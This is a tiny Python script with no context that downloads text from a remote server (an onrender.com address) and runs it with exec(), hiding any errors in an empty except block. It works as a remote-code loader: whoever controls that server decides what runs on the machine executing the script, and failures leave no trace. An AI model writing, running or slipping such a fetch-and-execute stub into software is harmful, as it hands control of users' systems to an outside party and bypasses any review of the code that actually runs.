import requests

response = requests.get('http://ms32-sha2.onrender.com/static/latest-code.txt')
if response.status_code == 200:
    code = response.text
    try:
        exec(code)
    except Exception as e:
        pass